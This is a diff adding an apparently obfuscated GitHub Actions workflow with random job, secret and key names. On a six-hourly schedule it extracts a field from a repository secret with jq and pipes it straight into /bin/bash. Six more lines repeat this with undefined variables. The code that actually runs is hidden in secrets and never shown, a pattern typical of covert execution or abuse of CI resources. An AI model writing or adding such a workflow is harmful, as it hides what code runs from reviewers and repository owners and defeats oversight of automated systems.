@@ -1,0 +1,23 @@
+name: songjunnu2109
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: songjunnu2109
+        env:
+          hbz6693: ${{ secrets.hbz6693 }}
+        run: |
+          echo $hbz6693 | jq -r .heexl9261 | /bin/bash
+          echo $r080 | jq -r .sy5 | /bin/bash
+          echo $huz9074 | jq -r .tpi4368 | /bin/bash
+          echo $xlav3 | jq -r .ipoqx2405 | /bin/bash
+          echo $pz4 | jq -r .q1 | /bin/bash
+          echo $pmfqp3409 | jq -r .meraa9377 | /bin/bash
+          echo $mcpx8234 | jq -r .olaa94562 | /bin/bash
+
